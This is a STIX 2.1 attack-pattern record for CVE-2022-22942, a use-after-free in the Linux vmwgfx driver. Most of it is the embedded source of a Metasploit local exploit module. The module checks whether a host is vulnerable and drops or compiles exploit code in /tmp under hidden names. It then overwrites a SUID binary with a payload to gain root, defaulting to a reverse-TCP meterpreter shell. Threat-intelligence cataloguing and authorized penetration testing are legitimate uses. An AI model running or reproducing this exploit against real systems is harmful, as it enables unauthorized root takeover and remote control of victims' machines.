{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7758c2c2-2b5c-4453-903f-e10a784f78ce",
    "created": "2024-08-14T16:59:22.680193Z",
    "modified": "2024-08-14T16:59:22.680197Z",
    "name": "vmwgfx Driver File Descriptor Handling Priv Esc",
    "description": " If the vmwgfx driver fails to copy the 'fence_rep' object to userland, it tries to recover by deallocating the (already populated) file descriptor. This is wrong, as the fd gets released via put_unused_fd() which shouldn't be used as the fd table slot was already populated via the previous call to fd_install(). This leaves userland with a valid fd table entry pointing to a free'd 'file' object.  We use this bug to overwrite a SUID binary with our payload and gain root. Linux kernel 4.14-rc1 - 5.17-rc1 are vulnerable.  Successfully tested against Ubuntu 22.04.01 with kernel 5.13.12-051312-generic.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/vmwgfx_fd_priv_esc.rb",
            "external_id": "vmwgfx_fd_priv_esc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://grsecurity.net/exploiting_and_defending_against_same_type_object_reuse"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/opensrcsec/same_type_object_reuse_exploits"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-22942"
        },
        {
            "source_name": "c_code=exploit_source(CVE-2022-22942",
            "external_id": "cve-2022-22942-dc.c)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Post::Linux::Compile\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'vmwgfx Driver File Descriptor Handling Priv Esc',\n        'Description' => %q{\n          If the vmwgfx driver fails to copy the 'fence_rep' object to userland, it tries to\n          recover by deallocating the (already populated) file descriptor. This is\n          wrong, as the fd gets released via put_unused_fd() which shouldn't be used,\n          as the fd table slot was already populated via the previous call to\n          fd_install(). This leaves userland with a valid fd table entry pointing to\n          a free'd 'file' object.\n\n          We use this bug to overwrite a SUID binary with our payload and gain root.\n          Linux kernel 4.14-rc1 - 5.17-rc1 are vulnerable.\n\n          Successfully tested against Ubuntu 22.04.01 with kernel 5.13.12-051312-generic.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Mathias Krause' # original PoC, analysis\n        ],\n        'Platform' => [ 'linux' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [[ 'Auto', {} ]],\n        'Privileged' => true,\n        'References' => [\n          [ 'URL', 'https://grsecurity.net/exploiting_and_defending_against_same_type_object_reuse' ],\n          [ 'URL', 'https://github.com/opensrcsec/same_type_object_reuse_exploits' ],\n          [ 'CVE', '2022-22942' ]\n        ],\n        'DisclosureDate' => '2022-01-28',\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',\n          'PrependFork' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_OS_DOWN],\n          'Reliability' => [REPEATABLE_SESSION],\n          # seeing \"BUG: Bad page cache in process <process> pfn:<5 characters>\" on console\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]\n        }\n      )\n    )\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write and execute files', '/tmp' ])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def check\n    # Check the kernel version to see if its in a vulnerable range\n    release = kernel_release\n    unless Rex::Version.new(release) > Rex::Version.new('4.14-rc1') &&\n           Rex::Version.new(release) < Rex::Version.new('5.17-rc1')\n      return CheckCode::Safe(\"Kernel version #{release} is not vulnerable\")\n    end\n\n    vprint_good \"Kernel version #{release} appears to be vulnerable\"\n\n    @driver = nil\n\n    if writable?('/dev/dri/card0') # ubuntu, RHEL\n      @driver = '/dev/dri/card0'\n    elsif writable?('/dev/dri/renderD128') # debian\n      @driver = '/dev/dri/renderD128'\n    else\n      return CheckCode::Safe('Unable to write to /dev/dri/card0 or /dev/dri/renderD128')\n    end\n    vprint_good(\"#{@driver} found writable\")\n\n    @suid_target = nil\n    if setuid?('/bin/chfn') # ubuntu\n      @suid_target = '/bin/chfn'\n    elsif writable?('/bin/chage') # RHEL/Centos\n      @suid_target = '/bin/chage'\n    else\n      return CheckCode::Safe('/bin/chfn isn\\'t SUID or /bin/chage not writable')\n    end\n    vprint_good(\"#{@suid_target} suid binary found\")\n\n    if kernel_modules&.include?('vmwgfx')\n      return CheckCode::Appears('vmwgfx installed')\n    end\n\n    CheckCode::Safe('Vulnerable driver (vmwgfx) not found')\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    # Make sure we can write our exploit and payload to the local system\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    # backup the suid binary before we overwrite it\n    @suid_backup = read_file(@suid_target)\n    path = store_loot(\n      @suid_target,\n      'application/octet-stream',\n      rhost,\n      @suid_backup,\n      @suid_target\n    )\n    print_good(\"Original #{@suid_target} backed up to #{path}\")\n    executable_name = \".#{rand_text_alphanumeric(5..10)}\"\n    executable_path = \"#{base_dir}/#{executable_name}\"\n    if live_compile?\n      vprint_status 'Live compiling exploit on system...'\n      payload_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n\n      c_code = exploit_source('CVE-2022-22942', 'cve-2022-22942-dc.c')\n      c_code = c_code.gsub('/dev/dri/card0', @driver) # ensure the right driver device is called\n      c_code = c_code.gsub('/bin/chfn', @suid_target) # ensure we have our suid target\n      c_code = c_code.gsub('/proc/self/exe', payload_path) # change exe to our payload\n\n      upload_and_compile executable_path, strip_comments(c_code)\n      register_files_for_cleanup(executable_path)\n    else\n      unless @suid_target == '/bin/chfn'\n        fail_with(Failure::BadConfig, 'Pre-compiled is only valid against Ubuntu based systems')\n      end\n      vprint_status 'Dropping pre-compiled exploit on system...'\n      payload_path = '/tmp/.aYd3GAMlK'\n      upload_and_chmodx executable_path, exploit_data('CVE-2022-22942', 'pre_compiled')\n    end\n\n    # Upload payload executable\n    print_status(\"Uploading payload to #{payload_path}\")\n    upload_and_chmodx payload_path, generate_payload_exe\n    register_files_for_cleanup(generate_payload_exe)\n\n    print_status 'Launching exploit...'\n    output = cmd_exec executable_path, nil, 30\n    output.each_line { |line| vprint_status line.chomp }\n  end\n\n  def cleanup\n    if @suid_backup.nil?\n      print_bad(\"MANUAL replacement of trojaned #{@suid_target} is required.\")\n    else\n      print_status(\"Replacing trojaned #{@suid_target} with original\")\n      write_file(@suid_target, @suid_backup)\n    end\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-01-28",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}